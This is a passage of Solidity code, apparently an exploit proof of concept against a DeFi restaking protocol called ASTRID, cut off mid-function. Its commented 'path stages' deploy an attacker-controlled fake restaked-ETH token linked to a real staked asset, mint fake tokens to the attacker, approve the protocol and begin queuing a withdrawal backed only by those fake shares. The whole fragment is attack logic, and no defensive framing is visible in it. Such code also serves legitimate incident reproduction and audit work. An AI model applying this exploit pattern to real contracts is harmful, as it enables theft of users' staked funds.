            // Path stage 1: deploy an attacker-controlled ERC20 that also implements
            // the restaked-token interface and points back to a real staked asset.
            FakeRestakedETH fake = new FakeRestakedETH(selectedStakedToken, address(this));
            fakeRestakedToken = address(fake);
        }

        if (IERC20Minimal(fakeRestakedToken).balanceOf(address(this)) < selectedAmount) {
            // Path stage 2: self-issue fake restaked tokens to the attacker.
            IRestakedETHLike(fakeRestakedToken).mint(address(this), selectedAmount);
        }

        if (IERC20Minimal(fakeRestakedToken).allowance(address(this), address(ASTRID)) < selectedAmount) {
            IERC20Minimal(fakeRestakedToken).approve(address(ASTRID), type(uint256).max);
        }

        uint256 withdrawerIndexBefore = ASTRID.withdrawalRequestsByUserLength(address(this));

        // Path stage 3: queue withdrawal backed only by attacker-issued fake shares.
